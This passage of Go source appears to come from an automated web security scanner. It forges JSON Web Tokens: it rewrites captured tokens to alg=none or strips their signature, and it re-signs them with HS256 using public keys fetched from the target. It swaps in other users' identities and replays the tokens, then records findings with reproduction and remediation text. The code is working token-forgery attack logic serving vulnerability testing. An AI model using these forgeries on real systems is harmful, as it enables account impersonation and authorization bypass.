func jwtKeyConfusionIdentityCandidatesFromTraffic(entries []types.TrafficEntry) []jwtIdentityCandidate {
	return jwtIdentityCandidatesFromTraffic(entries, jwtKeyConfusionIdentityCandidatesFromText)
}

func jwtIdentityCandidatesFromTraffic(entries []types.TrafficEntry, fromText func(string, string) []jwtIdentityCandidate) []jwtIdentityCandidate {
	var candidates []jwtIdentityCandidate
	for _, entry := range entries {
		requestSource := firstNonBlank(entry.Request.Path, entry.Request.URL, "observed request")
		responseSource := firstNonBlank(entry.Request.Path, entry.Request.URL, "observed response")
		if len(entry.Request.Body) > 0 {
			candidates = append(candidates, fromText(string(entry.Request.Body), requestSource+" request")...)
		}
		if len(entry.Response.Body) > 0 {
			candidates = append(candidates, fromText(string(entry.Response.Body), responseSource+" response")...)
		}
	}
	return candidates
}

func jwtUnsignedCandidateIdentitiesFromCandidates(candidates []jwtIdentityCandidate, originalIdentity string, target string, limit int) []string {
	return jwtCandidateIdentitiesFromCandidates(candidates, originalIdentity, target, limit,
		[]string{"jwt-none", "unsigned-jwt", "aobtd-jwt-none", "jwtn3d"})
}

func jwtKeyConfusionCandidateIdentitiesFromCandidates(candidates []jwtIdentityCandidate, originalIdentity string, target string, limit int) []string {
	return jwtCandidateIdentitiesFromCandidates(candidates, originalIdentity, target, limit,
		[]string{"rsa-forged", "jwt-hs256", "aobtd-jwt-hs256"})
}

func jwtCandidateIdentitiesFromCandidates(candidates []jwtIdentityCandidate, originalIdentity string, target string, limit int, syntheticLocals []string) []string {
	if limit <= 0 {
		limit = 12
	}
	seen := make(map[string]bool)
	var out []string
	add := func(identity string) {
		if len(out) >= limit {
			return
		}
		identity = strings.TrimSpace(identity)
		if identity == "" {
			return
		}
		key := strings.ToLower(identity)
		if seen[key] {
			return
		}
		seen[key] = true
		out = append(out, identity)
	}

	for _, candidate := range mergeJWTIdentityCandidates(candidates) {
		add(candidate.Identity)
	}

	domain := jwtUnsignedSyntheticIdentityDomain(originalIdentity, target)
	for _, local := range syntheticLocals {
		if domain != "" {
			add(local + "@" + domain)
		}
	}
	add(originalIdentity)
	return out
}

func jwtUnsignedIdentityCandidatesFromText(text string, source string) []jwtIdentityCandidate {
	return jwtIdentityCandidatesFromTextWithScorer(text, source, jwtUnsignedIdentityCandidateScore)
}

func jwtKeyConfusionIdentityCandidatesFromText(text string, source string) []jwtIdentityCandidate {
	return jwtIdentityCandidatesFromTextWithScorer(text, source, jwtKeyConfusionIdentityCandidateScore)
}

func jwtIdentityCandidatesFromTextWithScorer(text string, source string, scorer func(string, string, string) int) []jwtIdentityCandidate {
	if text == "" {
		return nil
	}
	indexes := observedEmailLikeRegex.FindAllStringIndex(text, 32)
	out := make([]jwtIdentityCandidate, 0, len(indexes))
	for _, idx := range indexes {
		if len(idx) != 2 || idx[0] < 0 || idx[1] > len(text) || idx[0] >= idx[1] {
			continue
		}
		identity := text[idx[0]:idx[1]]
		start := idx[0] - 220
		if start < 0 {
			start = 0
		}
		end := idx[1] + 220
		if end > len(text) {
			end = len(text)
		}
		context := text[start:end]
		score := scorer(identity, context, source)
		nearStart := idx[0] - 96
		if nearStart < 0 {
			nearStart = 0
		}
		nearEnd := idx[1] + 96
		if nearEnd > len(text) {
			nearEnd = len(text)
		}
		near := strings.ToLower(text[nearStart:nearEnd])
		shortStart := idx[0] - 64
		if shortStart < 0 {
			shortStart = 0
		}
		shortBefore := strings.ToLower(text[shortStart:idx[0]])
		shortAfterEnd := idx[1] + 32
		if shortAfterEnd > len(text) {
			shortAfterEnd = len(text)
		}
		shortAfter := strings.ToLower(text[idx[1]:shortAfterEnd])
		if strings.Contains(shortBefore, "<i>") && strings.Contains(shortAfter, "</i>") ||
			strings.Contains(shortBefore, "<code>") && strings.Contains(shortAfter, "</code>") ||
			strings.Contains(shortBefore, "<b>") && strings.Contains(shortAfter, "</b>") {
			score += 12
		}
		if strings.Contains(shortBefore, "impersonat") ||
			strings.Contains(shortBefore, "act as") ||
			strings.Contains(shortBefore, "login as") ||
			strings.Contains(shortBefore, "forge") ||
			strings.Contains(shortBefore, "user <") ||
			strings.Contains(shortBefore, "<i>") {
			score += 8
		}
		if strings.Contains(near, "non-existing") ||
			strings.Contains(near, "non existing") ||
			strings.Contains(near, "does not exist") {
			score += 4
		}
		out = append(out, jwtIdentityCandidate{Identity: identity, Source: source, Score: score})
	}
	return out
}

func mergeJWTIdentityCandidates(candidates []jwtIdentityCandidate) []jwtIdentityCandidate {
	best := make(map[string]jwtIdentityCandidate)
	for _, candidate := range candidates {
		identity := strings.TrimSpace(candidate.Identity)
		if identity == "" {
			continue
		}
		key := strings.ToLower(identity)
		candidate.Identity = identity
		if existing, ok := best[key]; !ok || candidate.Score > existing.Score ||
			(candidate.Score == existing.Score && len(candidate.Source) < len(existing.Source)) {
			best[key] = candidate
		}
	}
	out := make([]jwtIdentityCandidate, 0, len(best))
	for _, candidate := range best {
		out = append(out, candidate)
	}
	sort.SliceStable(out, func(i, j int) bool {
		if out[i].Score == out[j].Score {
			return out[i].Identity < out[j].Identity
		}
		return out[i].Score > out[j].Score
	})
	return out
}

func jwtUnsignedIdentityCandidateScore(identity string, context string, source string) int {
	score := 1
	lowerContext := strings.ToLower(context)
	lowerSource := strings.ToLower(source)
	lowerIdentity := strings.ToLower(identity)
	local := lowerIdentity
	if at := strings.Index(local, "@"); at >= 0 {
		local = local[:at]
	}
	if strings.Contains(lowerContext, "unsigned") ||
		strings.Contains(lowerContext, "alg:none") ||
		strings.Contains(lowerContext, "alg=none") ||
		strings.Contains(lowerContext, `"alg":"none"`) ||
		strings.Contains(lowerContext, "without signature") ||
		strings.Contains(lowerContext, "empty signature") {
		score += 10
	}
	if strings.Contains(lowerContext, "jwt") ||
		strings.Contains(lowerContext, "json web token") ||
		strings.Contains(lowerContext, "bearer") ||
		strings.Contains(lowerContext, "token") ||
		strings.Contains(lowerContext, "claim") ||
		strings.Contains(lowerContext, "signature") {
		score += 5
	}
	if strings.Contains(lowerContext, "forge") ||
		strings.Contains(lowerContext, "forged") ||
		strings.Contains(lowerContext, "impersonat") ||
		strings.Contains(lowerContext, "spoof") {
		score += 5
	}
	if strings.Contains(lowerContext, "non-existing") ||
		strings.Contains(lowerContext, "non existing") ||
		strings.Contains(lowerContext, "does not exist") {
		score += 2
	}
	for _, marker := range []string{"jwt", "token", "admin", "root", "support", "security", "rsa"} {
		if strings.Contains(local, marker) {
			score += 3
			break
		}
	}
	if strings.Contains(lowerSource, "challenge") {
		score += 4
	}
	if strings.Contains(lowerSource, "user") || strings.Contains(lowerSource, "account") || strings.Contains(lowerSource, "profile") {
		score += 2
	}
	return score
}

func jwtKeyConfusionIdentityCandidateScore(identity string, context string, source string) int {
	score := jwtUnsignedIdentityCandidateScore(identity, context, source)
	lowerContext := strings.ToLower(context)
	lowerIdentity := strings.ToLower(identity)
	local := lowerIdentity
	if at := strings.Index(local, "@"); at >= 0 {
		local = local[:at]
	}
	if strings.Contains(lowerContext, "rsa-signed") ||
		strings.Contains(lowerContext, "rsa signed") ||
		strings.Contains(lowerContext, "properly rsa") ||
		strings.Contains(lowerContext, "public key") ||
		strings.Contains(lowerContext, "key confusion") ||
		strings.Contains(lowerContext, "hs256") ||
		strings.Contains(lowerContext, "hmac") {
		score += 24
	}
	if strings.Contains(local, "rsa") {
		score += 30
	}
	if strings.Contains(lowerContext, "unsigned") ||
		strings.Contains(lowerContext, "alg:none") ||
		strings.Contains(lowerContext, "alg=none") ||
		strings.Contains(lowerContext, "without signature") {
		score -= 12
	}
	return score
}

func jwtUnsignedSyntheticIdentityDomain(originalIdentity string, target string) string {
	if at := strings.LastIndex(originalIdentity, "@"); at >= 0 && at < len(originalIdentity)-1 {
		domain := strings.ToLower(strings.TrimSpace(originalIdentity[at+1:]))
		if strings.Contains(domain, ".") {
			return domain
		}
	}
	if parsed, err := url.Parse(target); err == nil {
		host := strings.ToLower(parsed.Hostname())
		if strings.Contains(host, ".") {
			return host
		}
	}
	return "example.invalid"
}

func jwtIdentitySignalFromPayload(value any) string {
	var found string
	var walk func(any)
	walk = func(v any) {
		if found != "" {
			return
		}
		switch typed := v.(type) {
		case map[string]any:
			for _, key := range []string{"email", "username", "sub", "user", "name"} {
				if raw, ok := typed[key]; ok {
					if s, ok := raw.(string); ok && strings.TrimSpace(s) != "" {
						found = strings.TrimSpace(s)
						return
					}
				}
			}
			for _, child := range typed {
				walk(child)
				if found != "" {
					return
				}
			}
		case []any:
			for _, child := range typed {
				walk(child)
				if found != "" {
					return
				}
			}
		}
	}
	walk(value)
	return found
}

func jwtUnsignedCandidates(entries []types.TrafficEntry, target string) []jwtUnsignedCandidate {
	origin := originFromURL(target)
	if origin == "" {
		for _, entry := range entries {
			origin = originFromURL(entry.Request.URL)
			if origin != "" {
				break
			}
		}
	}
	if origin == "" {
		return nil
	}
	origin = strings.TrimRight(origin, "/")
	out := []jwtUnsignedCandidate{
		{URL: origin + "/rest/user/whoami", Path: "/rest/user/whoami", Source: "conventional identity endpoint"},
		{URL: origin + "/rest/user/whoami?fields=id,email", Path: "/rest/user/whoami", Source: "conventional identity endpoint with field projection"},
	}
	for _, entry := range entries {
		if !strings.EqualFold(entry.Request.Method, "GET") || !requestHasCredentialMaterial(entry.Request.Headers) {
			continue
		}
		if entry.Response.StatusCode < 200 || entry.Response.StatusCode >= 300 {
			continue
		}
		path := entry.Request.Path
		if !jwtUnsignedCandidatePathLooksUseful(path, entry.Response.ContentType) {
			continue
		}
		rawURL := entry.Request.URL
		if originFromURL(rawURL) == "" {
			if !strings.HasPrefix(path, "/") {
				path = "/" + path
			}
			rawURL = origin + path
		}
		out = append(out, jwtUnsignedCandidate{URL: rawURL, Path: entry.Request.Path, Source: "observed authenticated JSON GET"})
		if len(out) >= 8 {
			return out
		}
	}
	return out
}

func jwtUnsignedCandidatePathLooksUseful(path, contentType string) bool {
	lowerPath := strings.ToLower(path)
	if strings.Contains(lowerPath, ".js") || strings.Contains(lowerPath, ".css") ||
		strings.Contains(lowerPath, ".png") || strings.Contains(lowerPath, ".jpg") ||
		strings.Contains(lowerPath, "socket.io") || strings.Contains(lowerPath, "application-configuration") ||
		strings.Contains(lowerPath, "application-version") {
		return false
	}
	lowerCT := strings.ToLower(contentType)
	if lowerCT != "" && !strings.Contains(lowerCT, "json") {
		return false
	}
	for _, term := range []string{"whoami", "me", "user", "account", "profile", "basket", "cart", "order", "admin"} {
		if strings.Contains(lowerPath, term) {
			return true
		}
	}
	return false
}

func dedupeJWTUnsignedCandidates(candidates []jwtUnsignedCandidate) []jwtUnsignedCandidate {
	seen := make(map[string]bool)
	out := make([]jwtUnsignedCandidate, 0, len(candidates))
	for _, candidate := range candidates {
		if candidate.URL == "" || seen[candidate.URL] {
			continue
		}
		if candidate.Path == "" {
			if parsed, err := url.Parse(candidate.URL); err == nil {
				candidate.Path = parsed.Path
			}
		}
		seen[candidate.URL] = true
		out = append(out, candidate)
	}
	return out
}

func firstNonBlank(values ...string) string {
	for _, value := range values {
		if strings.TrimSpace(value) != "" {
			return value
		}
	}
	return ""
}

func jwtUnsignedTransportAttempts(forged string) []jwtUnsignedAttempt {
	return []jwtUnsignedAttempt{
		{
			Headers:   map[string]string{"Authorization": "Bearer " + forged},
			Transport: "Authorization: Bearer",
		},
		{
			Headers:   map[string]string{"Cookie": appendCookieValue("", "token", forged)},
			Transport: "Cookie: token",
		},
	}
}

func jwtUnsignedAcceptedSignal(identity string, baselineStatus int, baselineBody string, status int, body string) string {
	if status < 200 || status >= 300 {
		return ""
	}
	if identity != "" && strings.Contains(body, identity) && !strings.Contains(baselineBody, identity) {
		return "forged unsigned token returned identity " + identity
	}
	if (baselineStatus == http.StatusUnauthorized || baselineStatus == http.StatusForbidden) &&
		recoveredObjectAccessSignal(body) != "" {
		return fmt.Sprintf("anonymous baseline was HTTP %d; unsigned token returned object-shaped JSON", baselineStatus)
	}
	if baselineStatus == status && body != baselineBody &&
		!approxSameResponseSize(len(body), len(baselineBody)) &&
		jwtAuthResponseLooksAuthenticated(body) &&
		!jwtAuthResponseLooksAuthenticated(baselineBody) {
		return "unsigned token changed anonymous response into authenticated-looking JSON"
	}
	return ""
}

func jwtAuthResponseLooksAuthenticated(body string) bool {
	lower := strings.ToLower(body)
	if !strings.Contains(lower, "{") {
		return false
	}
	return strings.Contains(lower, `"email"`) ||
		strings.Contains(lower, `"role"`) ||
		strings.Contains(lower, `"userid"`) ||
		strings.Contains(lower, `"user"`) ||
		strings.Contains(lower, `"account"`) ||
		strings.Contains(lower, `"basketitem"`)
}

func (v *VerifierAgent) storeJWTUnsignedFinding(candidate jwtUnsignedCandidate, attempt jwtUnsignedAttempt, baselineStatus int, baselineBody string, status int, body string, variant jwtUnsignedForgeVariant, signal string) {
	path := candidate.Path
	if path == "" {
		path = candidate.URL
	}
	title := fmt.Sprintf("JWT alg=none accepted at %s", path)
	evidence := fmt.Sprintf("URL: %s\nTransport: %s\nClaim variant: %s\nBaseline status: %d\nForged status: %d\nIdentity signal: %s\nAcceptance signal: %s\nResponse preview: %s\nBaseline preview: %s",
		candidate.URL, attempt.Transport, variant.Note, baselineStatus, status, variant.Identity, signal, truncateString(body, 700), truncateString(baselineBody, 400))
	profile := types.PageProfile{ID: "GET " + path, URL: candidate.URL, Method: "GET"}
	v.storeFinding(profile, types.Finding{
		Title:       title,
		Description: fmt.Sprintf("A captured signed JWT was rewritten with header `alg:none` and an empty signature, then replayed via %s. Claim variant: %s. The endpoint accepted the unsigned token (%s). Source: %s.", attempt.Transport, variant.Note, signal, candidate.Source),
		Severity:    types.SeverityCritical,
		Confidence:  types.ConfidenceConfirmed,
		EndpointID:  "GET " + path,
		VulnType:    "jwt_unsigned",
		ParamName:   "Authorization/Cookie token",
		Payload:     truncateString(variant.Token, 180),
		PocRequest: fmt.Sprintf("GET %s HTTP/1.1\nHost: <target>\n%s: <alg-none JWT>\n\n# Baseline anonymous status: %d",
			path, strings.Split(attempt.Transport, ":")[0], baselineStatus),
		PocResponse: fmt.Sprintf("HTTP/1.1 %d\n\n%s", status, truncateString(body, 800)),
		StepsToReproduce: fmt.Sprintf(
			"1. Capture a legitimate JWT from the application.\n"+
				"2. Replace its header with `{%q:%q,%q:%q}` and remove the signature segment.\n"+
				"3. Replay the unsigned token to %s using %s.\n"+
				"4. Observe the response is accepted while the anonymous baseline is not equivalent.",
			"alg", "none", "typ", "JWT", candidate.URL, attempt.Transport),
		Impact: "If unsigned JWTs are accepted, attackers can forge or tamper with token claims without knowing the signing key. " +
			"This can lead to account impersonation, privilege escalation, and bypass of downstream authorization decisions.",
		Remediation: "Reject `alg:none`, ignore token-supplied algorithms when choosing verification behavior, pin the expected signing algorithm server-side, and require a valid signature for every JWT-bearing request.",
		Evidence:    evidence,
	})
}

type jwtKeyConfusionMaterial struct {
	Key       []byte
	SourceURL string
	Note      string
}

func (v *VerifierAgent) probeJWTKeyConfusion(ctx context.Context, target string) {
	entries, err := v.db.GetTrafficByScan(v.scanID)
	if err != nil {
		return
	}
	tokens := jwtTokensFromObservedAuth(entries, v.credentialHeadersForJWTProbe(target))
	if len(tokens) == 0 {
		return
	}
	if len(tokens) > 1 {
		tokens = tokens[:1]
	}
	keys := v.discoverJWTKeyConfusionMaterials(ctx, target, entries)
	if len(keys) == 0 {
		return
	}
	candidates := dedupeJWTUnsignedCandidates(jwtUnsignedCandidates(entries, target))
	if len(candidates) == 0 {
		return
	}
	sort.SliceStable(candidates, func(i, j int) bool {
		return jwtUnsignedCandidatePriority(candidates[i]) > jwtUnsignedCandidatePriority(candidates[j])
	})
	if len(candidates) > 4 {
		candidates = candidates[:4]
	}

	v.db.InsertNarration(v.scanID, "verifier", "attempt",
		fmt.Sprintf("Planning JWT RSA/HS key-confusion probes with %d exposed public key candidate(s), %d captured JWT sample(s), and %d auth endpoint(s).",
			len(keys), len(tokens), len(candidates)),
		target, nil)

	const maxAttempts = 16
	attempts := 0
	for _, token := range tokens {
		_, payload, _, ok := jwtDecodeSignedJWTPayload(token)
		if !ok {
			continue
		}
		identity := jwtIdentitySignalFromPayload(payload)
		candidateIdentities := v.discoverJWTKeyConfusionCandidateIdentities(ctx, target, entries, identity, 16)
		for _, key := range keys {
			variants := jwtHS256KeyConfusionForgeVariants(token, key.Key, candidateIdentities, 8)
			if len(variants) == 0 {
				continue
			}
			for _, candidate := range candidates {
				if ctx.Err() != nil || attempts >= maxAttempts {
					return
				}
				baselineResp, baselineBody, _, err := v.proactiveGETWithHeaders(ctx, candidate.URL, nil, "AOBTD/Verifier (jwt-key-confusion anonymous baseline)")
				if err != nil || baselineResp == nil {
					continue
				}
				for _, variant := range variants {
					for _, attempt := range jwtUnsignedTransportAttempts(variant.Token) {
						if ctx.Err() != nil || attempts >= maxAttempts {
							return
						}
						resp, body, _, err := v.proactiveGETWithHeaders(ctx, candidate.URL, attempt.Headers, "AOBTD/Verifier (jwt-key-confusion probe)")
						v.tested++
						attempts++
						if err != nil || resp == nil {
							v.dismissed++
							continue
						}
						signal := jwtUnsignedAcceptedSignal(variant.Identity, baselineResp.StatusCode, baselineBody, resp.StatusCode, body)
						if signal == "" {
							v.dismissed++
							continue
						}
						v.confirmed++
						v.storeJWTKeyConfusionFinding(candidate, attempt, key, baselineResp.StatusCode, baselineBody, resp.StatusCode, body, variant, signal)
						v.db.InsertNarration(v.scanID, "verifier", "confirmed",
							fmt.Sprintf("JWT public-key/HMAC confusion accepted at %s via %s using key from %s (%s).",
								candidate.Path, attempt.Transport, firstNonBlank(key.SourceURL, key.Note), signal),
							candidate.URL, map[string]any{
								"transport":       attempt.Transport,
								"identity_signal": variant.Identity,
								"claim_variant":   variant.Note,
								"key_source":      key.SourceURL,
								"source":          candidate.Source,
							})
						return
					}
				}
			}
		}
	}
}

func (v *VerifierAgent) discoverJWTKeyConfusionMaterials(ctx context.Context, target string, entries []types.TrafficEntry) []jwtKeyConfusionMaterial {
	seen := make(map[string]bool)
	var out []jwtKeyConfusionMaterial
	add := func(material jwtKeyConfusionMaterial) {
		if len(out) >= 8 || len(material.Key) == 0 {
			return
		}
		key := shortDigest(string(material.Key)) + "\x00" + material.SourceURL
		if seen[key] {
			return
		}
		seen[key] = true
		out = append(out, material)
	}
	for _, entry := range entries {
		for _, material := range jwtKeyConfusionMaterialsFromBody(entry.Response.Body, entry.Request.URL, entry.Response.ContentType) {
			add(material)
		}
	}
	origin := strings.TrimRight(originFromURL(target), "/")
	if origin == "" {
		for _, entry := range entries {
			origin = strings.TrimRight(originFromURL(entry.Request.URL), "/")
			if origin != "" {
				break
			}
		}
	}
	if origin == "" {
		return out
	}
	for _, path := range jwtKeyConfusionCandidateKeyPaths() {
		if ctx.Err() != nil || len(out) >= 8 {
			break
		}
		u := origin + path
		resp, body, _, err := v.proactiveGET(ctx, u)
		if err != nil || resp == nil || resp.StatusCode < 200 || resp.StatusCode >= 300 {
			continue
		}
		for _, material := range jwtKeyConfusionMaterialsFromBody([]byte(body), u, resp.Header.Get("Content-Type")) {
			add(material)
		}
	}
	return out
}

func jwtKeyConfusionCandidateKeyPaths() []string {
	return []string{
		"/.well-known/jwks.json",
		"/jwks.json",
		"/jwt.pub",
		"/jwt/public.key",
		"/public.key",
		"/public.pem",
		"/keys/jwt.pub",
		"/keys/public.key",
		"/keys/public.pem",
		"/encryptionkeys/jwt.pub",
	}
}

func jwtKeyConfusionMaterialsFromBody(body []byte, sourceURL, contentType string) []jwtKeyConfusionMaterial {
	if len(body) == 0 || len(body) > 256*1024 {
		return nil
	}
	text := string(body)
	lower := strings.ToLower(text)
	if strings.Contains(lower, "<html") && !strings.Contains(lower, "begin ") {
		return nil
	}
	var out []jwtKeyConfusionMaterial
	for _, blockType := range []string{"RSA PUBLIC KEY", "PUBLIC KEY"} {
		begin := "-----BEGIN " + blockType + "-----"
		end := "-----END " + blockType + "-----"
		start := strings.Index(text, begin)
		stop := strings.Index(text, end)
		if start < 0 || stop < start {
			continue
		}
		stop += len(end)
		key := []byte(text[start:stop])
		out = append(out, jwtKeyConfusionMaterial{Key: key, SourceURL: sourceURL, Note: blockType + " PEM"})
	}
	if len(out) > 0 {
		return out
	}
	ct := strings.ToLower(contentType)
	if strings.Contains(ct, "json") || strings.Contains(lower, `"kty"`) {
		var decoded map[string]any
		if err := json.Unmarshal(body, &decoded); err == nil {
			for _, material := range jwtKeyConfusionMaterialsFromJWK(decoded, sourceURL) {
				out = append(out, material)
			}
		}
	}
	return out
}

func jwtKeyConfusionMaterialsFromJWK(decoded map[string]any, sourceURL string) []jwtKeyConfusionMaterial {
	var out []jwtKeyConfusionMaterial
	addJWK := func(m map[string]any) {
		kty, _ := m["kty"].(string)
		if !strings.EqualFold(kty, "RSA") {
			return
		}
		if x5c, ok := m["x5c"].([]any); ok && len(x5c) > 0 {
			if cert, ok := x5c[0].(string); ok && strings.TrimSpace(cert) != "" {
				pem := "-----BEGIN CERTIFICATE-----\n" + strings.TrimSpace(cert) + "\n-----END CERTIFICATE-----"
				out = append(out, jwtKeyConfusionMaterial{Key: []byte(pem), SourceURL: sourceURL, Note: "RSA JWK x5c certificate"})
				return
			}
		}
		n, nok := m["n"].(string)
		e, eok := m["e"].(string)
		if nok && eok && strings.TrimSpace(n) != "" && strings.TrimSpace(e) != "" {
			canonical, _ := json.Marshal(map[string]string{"kty": "RSA", "n": strings.TrimSpace(n), "e": strings.TrimSpace(e)})
			out = append(out, jwtKeyConfusionMaterial{Key: canonical, SourceURL: sourceURL, Note: "RSA JWK public components"})
		}
	}
	if keys, ok := decoded["keys"].([]any); ok {
		for _, item := range keys {
			if m, ok := item.(map[string]any); ok {
				addJWK(m)
			}
		}
		return out
	}
	addJWK(decoded)
	return out
}

func jwtHS256KeyConfusionForgeVariants(token string, key []byte, candidateIdentities []string, limit int) []jwtUnsignedForgeVariant {
	if limit <= 0 || len(key) == 0 {
		return nil
	}
	_, payload, _, ok := jwtDecodeSignedJWTPayload(token)
	if !ok {
		return nil
	}
	payloadMap, _ := payload.(map[string]any)
	if len(payloadMap) == 0 {
		return nil
	}
	originalIdentity := jwtIdentitySignalFromPayload(payload)
	seenTokens := make(map[string]bool)
	var variants []jwtUnsignedForgeVariant
	add := func(payload map[string]any, identity, note string) {
		if len(variants) >= limit {
			return
		}
		forged, ok := jwtHS256TokenFromPayload(payload, key)
		if !ok || seenTokens[forged] {
			return
		}
		seenTokens[forged] = true
		variants = append(variants, jwtUnsignedForgeVariant{Token: forged, Identity: identity, Note: note})
	}
	for _, identity := range candidateIdentities {
		if len(variants) >= limit-1 {
			break
		}
		identity = strings.TrimSpace(identity)
		if identity == "" || strings.EqualFold(identity, originalIdentity) {
			continue
		}
		cloned, ok := cloneJSONMapDeep(payloadMap)
		if !ok || !setJWTIdentityClaims(cloned, identity) {
			continue
		}
		add(cloned, identity, "HS256 key-confusion claims mutated to "+identity)
	}
	add(payloadMap, originalIdentity, "HS256 key-confusion original claims preserved")
	return variants
}

func jwtHS256TokenFromPayload(payload map[string]any, key []byte) (string, bool) {
	body, err := json.Marshal(payload)
	if err != nil {
		return "", false
	}
	header := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"HS256","typ":"JWT"}`))
	payloadSegment := base64.RawURLEncoding.EncodeToString(body)
	signingInput := header + "." + payloadSegment
	mac := hmac.New(sha256.New, key)
	_, _ = mac.Write([]byte(signingInput))
	signature := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
	return signingInput + "." + signature, true
}

func (v *VerifierAgent) storeJWTKeyConfusionFinding(candidate jwtUnsignedCandidate, attempt jwtUnsignedAttempt, key jwtKeyConfusionMaterial, baselineStatus int, baselineBody string, status int, body string, variant jwtUnsignedForgeVariant, signal string) {
	path := candidate.Path
	if path == "" {
		path = candidate.URL
	}
	title := fmt.Sprintf("JWT accepts HS256 token signed with public key at %s", path)
	keySource := firstNonBlank(key.SourceURL, key.Note, "observed public key material")
	evidence := fmt.Sprintf("URL: %s\nTransport: %s\nClaim variant: %s\nKey source: %s\nKey note: %s\nBaseline status: %d\nForged status: %d\nIdentity signal: %s\nAcceptance signal: %s\nResponse preview: %s\nBaseline preview: %s",
		candidate.URL, attempt.Transport, variant.Note, keySource, key.Note, baselineStatus, status, variant.Identity, signal, truncateString(body, 700), truncateString(baselineBody, 400))
	profile := types.PageProfile{ID: "GET " + path, URL: candidate.URL, Method: "GET"}
	v.storeFinding(profile, types.Finding{
		Title:       title,
		Description: fmt.Sprintf("A captured signed JWT was re-signed as HS256 using public key material from %s as the HMAC secret, then replayed via %s. The endpoint accepted the forged token (%s). Source: %s.", keySource, attempt.Transport, signal, candidate.Source),
		Severity:    types.SeverityCritical,
		Confidence:  types.ConfidenceConfirmed,
		EndpointID:  "GET " + path,
		VulnType:    "jwt_key_confusion",
		ParamName:   "Authorization/Cookie token",
		Payload:     truncateString(variant.Token, 180),
		PocRequest: fmt.Sprintf("GET %s HTTP/1.1\nHost: <target>\n%s: <HS256 JWT signed with exposed public key>\n\n# Public key source: %s\n# Baseline anonymous status: %d",
			path, strings.Split(attempt.Transport, ":")[0], keySource, baselineStatus),
		PocResponse: fmt.Sprintf("HTTP/1.1 %d\n\n%s", status, truncateString(body, 800)),
		StepsToReproduce: fmt.Sprintf(
			"1. Obtain public JWT verification material from %s.\n"+
				"2. Capture a legitimate JWT and keep its payload structure.\n"+
				"3. Change the JWT header to `{%q:%q,%q:%q}` and sign the header.payload with HMAC-SHA256 using the public key bytes as the HMAC secret.\n"+
				"4. Replay the token to %s using %s.\n"+
				"5. Observe the forged token is accepted while the anonymous baseline is not equivalent.",
			keySource, "alg", "HS256", "typ", "JWT", candidate.URL, attempt.Transport),
		Impact: "RSA/HMAC JWT key confusion lets attackers forge signed JWTs using public verification material as a symmetric secret. " +
			"This can lead to arbitrary claim tampering, account impersonation, privilege escalation, and bypass of downstream authorization decisions.",
		Remediation: "Pin the expected JWT algorithm server-side, never trust the token-supplied alg header to choose verification behavior, reject symmetric algorithms for RSA/ECDSA-issued tokens, and separate public verification keys from any HMAC secrets.",
		Evidence:    evidence,
	})
}

type pathNamedJWTTarget struct {
	baseURL string
	path    string
	level   int
}

var jwtPathLevelPattern = regexp.MustCompile(`(?i)/JWTVulnerability/LEVEL_(\d+)`)

func (v *VerifierAgent) probePathNamedJWT(ctx context.Context, target string) {
	entries, err := v.db.GetTrafficByScan(v.scanID)
	if err != nil || len(entries) == 0 {
		return
	}
	targets := pathNamedJWTTargetsFromTraffic(entries)
	if len(targets) == 0 {
		return
	}
	seedToken := v.pathNamedJWTSeedToken(ctx, targets)
	if seedToken == "" {
		return
	}
	noneToken, _, noneOK := jwtNoneTokenFromSignedJWT(seedToken)
	emptySignatureToken := jwtEmptySignatureToken(seedToken)

	for _, target := range targets {
		if ctx.Err() != nil {
			return
		}
		switch {
		case target.level == 1:
			resp, body, _, err := v.proactiveGET(ctx, urlWithQueryParamMust(target.baseURL, "jwt", "aobtd"))
			if err == nil && resp != nil && jwtTokenFromText(body) != "" {
				v.tested++
				v.storePathNamedJWTFinding(target, "CLIENT_SIDE_VULNERABLE_JWT", types.SeverityMedium,
					"JWT exposed in anonymous JSON response",
					"GET "+target.path+" returned a JWT in a client-readable JSON body without requiring authentication.",
					"", resp.StatusCode, body, "query parameter jwt=aobtd")
				v.confirmed++
			}
		case target.level >= 2 && target.level <= 10 && target.level != 7:
			status, body, setCookie, transport, ok := v.pathNamedJWTTokenExposure(ctx, target, seedToken)
			v.tested++
			if ok && (jwtTokenFromText(body) != "" || jwtTokenFromText(setCookie) != "") {
				v.storePathNamedJWTFinding(target, "CLIENT_SIDE_VULNERABLE_JWT", types.SeverityMedium,
					"JWT exposed through client-readable cookie/response",
					pathNamedJWTClientDescription(target.level, setCookie, body),
					setCookie, status, body, transport)
				v.confirmed++
			} else {
				v.dismissed++
			}
		}

		if target.level == 4 || target.level == 14 || target.level == 16 {
			status, body, setCookie, transport, ok := v.pathNamedJWTTokenExposure(ctx, target, seedToken)
			v.tested++
			if ok && (jwtTokenFromText(body) != "" || jwtTokenFromText(setCookie) != "") {
				v.storePathNamedJWTFinding(target, "INSECURE_CONFIGURATION_JWT", types.SeverityHigh,
					"JWT insecure configuration observable at validation route",
					pathNamedJWTConfigDescription(target.level, setCookie, body),
					setCookie, status, body, transport)
				v.confirmed++
			} else {
				v.dismissed++
			}
		}

		switch target.level {
		case 6:
			if noneOK {
				status, body, setCookie, ok := v.pathNamedJWTReplayCookie(ctx, target, "JWT", noneToken, "jwt-none replay")
				v.tested++
				if ok && pathNamedJWTAccepted(status, body) {
					v.storePathNamedJWTFinding(target, "SERVER_SIDE_VULNERABLE_JWT", types.SeverityCritical,
						"JWT alg=none token accepted",
						"Replacing a signed JWT with an unsigned `alg:none` token in the JWT cookie still returned an accepted application response.",
						setCookie, status, body, "Cookie: JWT=<alg-none JWT>")
					v.confirmed++
				} else {
					v.dismissed++
				}
			}
		case 8, 9:
			status, body, setCookie, transport, ok := v.pathNamedJWTTokenExposure(ctx, target, seedToken)
			v.tested++
			if ok && pathNamedJWTServerIssuedDangerousToken(body) {
				v.storePathNamedJWTFinding(target, "SERVER_SIDE_VULNERABLE_JWT", types.SeverityCritical,
					"JWT server-side validation weakness exposed by issued token",
					"The route accepted a seed JWT token and issued a new JWT containing server-side danger signals such as admin claims, RSA/JWK trust material, or algorithm-confusion indicators.",
					setCookie, status, body, transport)
				v.confirmed++
			} else {
				v.dismissed++
			}
		case 15:
			if emptySignatureToken != "" {
				status, body, setCookie, ok := v.pathNamedJWTReplayCookie(ctx, target, "JWT", emptySignatureToken, "jwt-empty-signature replay")
				v.tested++
				if ok && pathNamedJWTAccepted(status, body) {
					v.storePathNamedJWTFinding(target, "SERVER_SIDE_VULNERABLE_JWT", types.SeverityCritical,
